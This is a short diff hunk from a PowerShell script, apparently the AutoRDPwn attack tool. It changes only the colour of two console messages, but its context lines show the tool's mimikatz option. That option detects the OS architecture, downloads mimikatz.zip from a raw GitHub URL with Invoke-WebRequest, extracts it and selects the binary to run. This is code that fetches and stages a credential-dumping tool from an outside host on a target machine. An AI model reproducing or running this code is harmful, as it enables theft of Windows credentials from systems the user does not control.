@@ -288,7 +288,7 @@ if($Language -in 'Spanish') {
 
         if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
-        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Green
+        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Yellow
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
@@ -298,7 +298,7 @@ if($Language -in 'Spanish') {
 
         if($mimikatz -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
-        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Green
+        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Yellow
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
